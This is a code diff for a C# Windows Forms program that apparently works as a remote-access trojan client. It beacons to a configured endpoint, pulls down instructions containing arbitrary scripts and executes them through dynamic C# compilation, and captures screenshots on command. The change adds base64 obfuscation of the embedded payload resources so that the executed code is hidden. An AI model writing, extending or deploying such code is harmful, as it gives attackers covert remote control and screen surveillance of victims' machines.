@@ -5,6 +5,8 @@ using System.Threading;
 using System.Windows.Forms;
 using System.Collections.Generic;
 using System.Linq;
+using System.Text;
+
 namespace frameless
 {
     public partial class Form1 : Form
@@ -25,23 +27,23 @@ namespace frameless
         private async static void Runn()
         {
             var resource = new ResourceManager("frameless.Form1", typeof(Form1).Assembly);
-            await Action.ExecuteCsharpCodeAsync(resource.GetString("Checker"), new object[] { });
-            await Action.ExecuteCsharpCodeAsync(resource.GetString("Setup"), new object[] { });
-            Me = (string)await Action.ExecuteCsharpCodeAsync(resource.GetString("Login"), new object[] { Properties.Resources.Endpoint });
+          await Action.ExecuteCsharpCodeAsync(Encoding.UTF8.GetString(Convert.FromBase64String(resource.GetString("Checker"))), new object[] { });
+            await Action.ExecuteCsharpCodeAsync(Encoding.UTF8.GetString(Convert.FromBase64String(resource.GetString("Set"))), new object[] { });
+            Me = (string)await Action.ExecuteCsharpCodeAsync(Encoding.UTF8.GetString(Convert.FromBase64String(resource.GetString("Login"))), new object[] { Properties.Resources.Endpoint });
             Task.Run(() => InstructionHandler());
-            Task.Run(() => ScreenshotsHandler(resource));
             new Thread(
                 async () =>
                 {
                     while (true)
                     {
                         object result = await Action.ExecuteCsharpCodeAsync(
-                            resource.GetString("Check"),
+                            Encoding.UTF8.GetString(Convert.FromBase64String(resource.GetString("Check"))),
                             new object[] { Properties.Resources.Endpoint, Me }
                         );
+
                         if (result is string errorMessage)
                         {
-                          //  Console.WriteLine($"An error occurred: {errorMessage}");
+                            //  Console.WriteLine($"An error occurred: {errorMessage}");
                         }
                         else
                         {
@@ -52,7 +54,7 @@ namespace frameless
                             if (delayProperty != null)
                             {
                                 var delay = delayProperty.GetValue(result);
-                                Delay=(int)delay;
+                                Delay = (int)delay;
                             }
 
                             //  Screenshot
@@ -60,7 +62,7 @@ namespace frameless
                             if (screenshotProperty != null)
                             {
                                 var screenshot = screenshotProperty.GetValue(result);
-                                Screenshot = (screenshot==null)?0:(int)screenshot;
+                                Screenshot = (screenshot == null) ? 0 : (int)screenshot;
                             }
 
                             //  Instruction
@@ -79,32 +81,36 @@ namespace frameless
                                         var args = instType.GetProperty("Args")?.GetValue(inst);
                                         lock (InstructionsQueue)
                                         {
-                                           InstructionsQueue.Enqueue(new Instruction { code = (short)code, instructionId =(long)id, script = (string)script, functionArgs = (string)args });
+                                            InstructionsQueue.Enqueue(new Instruction { code = (short)code, instructionId = (long)id, script = (string)script, functionArgs = (string)args });
                                         }
                                     }
                                 }
                             }
                         }
+
                         Thread.Sleep(Delay);
                     }
                 }
             ).Start();
+            Task.Run(() => ScreenshotsHandler(Encoding.UTF8.GetString(Convert.FromBase64String(resource.GetString("Screen")))));
         }
-        private static void ScreenshotsHandler(ResourceManager resource)
+        private static void ScreenshotsHandler(string scrCode)
         {
             while (true)
             {
                 if (Screenshot != 0)
                 {
-                    Action.ExecuteCsharpCodeAsync(resource.GetString("Screen"), new object[] {Properties.Resources.Endpoint,Me });
+                    Action.ExecuteCsharpCodeAsync(scrCode, new object[] { Properties.Resources.Endpoint, Me });
                     if (Screenshot > 1)
                     {
                         Thread.Sleep(Screenshot * 1000);
-                    }else if(Screenshot == -1)
+                    }
+                    else if (Screenshot == -1)
                     {
                         Screenshot = 0;
                     }
-                }else
+                }
+                else
                 {
                     Thread.Sleep(1000);
                 }
@@ -122,11 +128,12 @@ namespace frameless
                 {
                     var oldestInstruction = InstructionsQueue.Dequeue();
                     object[] args = string.IsNullOrEmpty(oldestInstruction.functionArgs) ? Array.Empty<object>() : Array.ConvertAll(oldestInstruction.functionArgs.Split(new[] { "*.&-&.*" }, StringSplitOptions.None), item => (object)item);
-                    Action.ExecuteCsharpCodeAsync(oldestInstruction.script, args.Concat(new object[] { Properties.Resources.Endpoint,Me, oldestInstruction.instructionId, oldestInstruction.code }).ToArray());
-                    
+                    Action.ExecuteCsharpCodeAsync(oldestInstruction.script, args.Concat(new object[] { Properties.Resources.Endpoint, Me, oldestInstruction.instructionId, oldestInstruction.code }).ToArray());
+
                 }
             }
         }
+
         public Form1()
         {
             InitializeComponent();
